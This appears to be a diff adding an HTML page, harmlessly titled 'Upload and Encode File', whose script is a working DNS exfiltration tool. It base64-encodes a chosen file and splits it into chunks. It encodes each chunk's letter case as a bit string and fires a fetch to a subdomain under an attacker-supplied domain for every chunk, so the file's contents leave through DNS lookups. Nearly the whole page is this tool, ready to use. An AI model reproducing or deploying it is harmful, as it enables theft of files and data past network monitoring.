@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Upload and Encode File</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      padding: 40px;
+      display: flex;
+      justify-content: center;
+    }
+    .container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 500px;
+    }
+    h3 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #555;
+    }
+    input[type="text"],
+    input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+  <script>
+    function runFile() {
+      const fileInput = document.getElementById("fileInput");
+      const domain = document.getElementById("domainInput").value;
+      const file = fileInput.files[0];
+
+      if (!file) {
+        alert("Please select a file.");
+        return;
+      }
+
+      const reader = new FileReader();
+      reader.readAsDataURL(file);
+      reader.onload = function () {
+        console.log(reader.result);
+        let base64 = reader.result.split(",")[1]
+          .replace(/\+/g, "-")
+          .replace(/\//g, "_")
+          .replace(/=+$/, "");
+
+        const partSize = 40;
+        const parts = [];
+        for (let i = 0; i < base64.length; i += partSize) {
+          parts.push(base64.slice(i, i + partSize));
+        }
+        for (let part in parts) {
+            var arry = [];
+            var obj = parts[part]
+            for (let string in obj){
+                if (obj[string] === obj[string].toUpperCase()){
+                    arry.push(1)
+                }else{
+                    arry.push(0)
+                }
+            }
+            var test = arry.join('');
+            var url = 'http://'+part+'.'+test+'.'+parts[part]+'.'+domain
+            fetch(url,{mode:"no-cors"})
+        }
+        
+      };
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h3>Upload and Encode File</h3>
+
+    <label for="domainInput">Domain</label>
+    <input type="text" id="domainInput" placeholder="Enter domain">
+
+    <label for="fileInput">File</label>
+    <input type="file" id="fileInput">
+
+    <button onclick="runFile()">Go</button>
+  </div>
+</body>
+</html>
